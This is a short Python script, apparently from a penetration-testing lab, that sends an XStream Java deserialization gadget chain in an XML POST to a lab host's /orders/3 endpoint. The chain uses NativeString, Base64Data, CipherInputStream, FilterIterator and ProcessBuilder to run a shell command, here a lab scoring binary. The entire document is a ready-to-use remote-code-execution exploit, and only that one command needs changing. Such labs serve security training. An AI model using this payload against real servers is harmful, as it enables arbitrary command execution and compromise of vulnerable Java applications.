#!/usr/bin/python

import socket

header = "POST http://ptl-e4695ad1-9686d858.libcurl.so/orders/3 HTTP/1.1\r\nHost: ptl-e4695ad1-9686d858.libcurl.so:80\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nContent-Type: application/xml\r\nContent-Length: CONTENT_LENGTH_BYTES\r\nConnection: close\r\n\r\n"

payload='<map>\r\n<entry>\r\n<jdk.nashorn.internal.objects.NativeString>\r\n<flags>0</flags>\r\n<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">\r\n<dataHandler>\r\n<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">\r\n<is class="javax.crypto.CipherInputStream">\r\n<cipher class="javax.crypto.NullCipher">\r\n<initialized>false</initialized>\r\n<opmode>0</opmode>\r\n<serviceIterator class="javax.imageio.spi.FilterIterator">\r\n<iter class="javax.imageio.spi.FilterIterator">\r\n<iter class="java.util.Collections$EmptyIterator"/>\r\n<next class="java.lang.ProcessBuilder">\r\n<command>\r\n<string>/bin/sh</string><string>-c</string><string>/usr/local/bin/score 3e6d8c3a-738b-416f-b8ce-dd85c466fed4</string>\r\n</command>\r\n<redirectErrorStream>false</redirectErrorStream>\r\n</next>\r\n</iter>\r\n<filter class="javax.imageio.ImageIO$ContainsFilter">\r\n<method>\r\n<class>java.lang.ProcessBuilder</class>\r\n<name>start</name>\r\n<parameter-types/>\r\n</method>\r\n<name>p4WVJLW2H</name>\r\n</filter>\r\n<next class="string">6Fcg22xLlaHiIK8</next>\r\n</serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>'

content_length = len(payload)
header = header.replace("CONTENT_LENGTH_BYTES", str(content_length))

#print header + payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ptl-e4695ad1-9686d858.libcurl.so",80))
s.sendall(header+payload)
data = s.recv(1024)
while (data):
	print data
	data = s.recv(1024)
print data
s.close()
